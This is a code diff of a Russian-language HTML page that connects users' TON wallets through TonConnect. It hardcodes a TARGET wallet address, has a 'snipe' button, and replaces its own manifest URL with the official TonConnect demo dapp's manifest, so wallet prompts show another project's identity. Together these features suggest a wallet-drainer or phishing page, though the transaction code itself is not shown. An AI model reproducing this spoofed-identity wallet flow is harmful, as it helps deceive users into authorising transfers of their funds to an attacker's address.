@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-  <title>TON App</title>
+  <title>TON</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -116,7 +116,6 @@
   <script>
     (function() {
       const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
-      const MANIFEST_URL = 'https://ckam-ce.vercel.app/manifest.json';
 
       const connectBtn = document.getElementById('connectBtn');
       const snipeBtn = document.getElementById('snipeBtn');
@@ -128,6 +127,7 @@
 
       let connector = null;
       let userAddress = null;
+      let initAttempts = 0;
 
       function showError(text) {
         errorBox.textContent = '❌ ' + text;
@@ -140,20 +140,27 @@
         errorBox.classList.remove('show');
       }
 
-      // ========== ИНИЦИАЛИЗАЦИЯ ==========
+      // ========== ИНИЦИАЛИЗАЦИЯ С ПОВТОРАМИ ==========
       function initTonConnect() {
         try {
+          initAttempts++;
+
           if (typeof TonConnect === 'undefined') {
-            status.innerText = '⏳ Загрузка TonConnect...';
-            setTimeout(initTonConnect, 500);
+            if (initAttempts < 30) {
+              status.innerText = '⏳ Загрузка TonConnect... (' + initAttempts + '/30)';
+              setTimeout(initTonConnect, 500);
+            } else {
+              showError('TonConnect не загрузился. Проверь интернет.');
+            }
             return;
           }
 
+          // ====== СОЗДАЁМ CONNECTOR С ВСТРОЕННЫМ МАНИФЕСТОМ ======
           connector = new TonConnect({
-            manifestUrl: MANIFEST_URL
+            manifestUrl: 'https://ton-connect.github.io/demo-dapp/tonconnect-manifest.json'
           });
 
-          console.log('✅ TonConnect инициализирован. Manifest:', MANIFEST_URL);
+          console.log('✅ TonConnect инициализирован');
 
           if (connector.connected) {
             userAddress = connector.account.address;
@@ -211,7 +218,7 @@
           connectBtn.disabled = true;
 
           if (!connector) {
-            showError('TonConnect не инициализирован');
+            showError('TonConnect не инициализирован. Подожди...');
             connectBtn.disabled = false;
             return;
           }
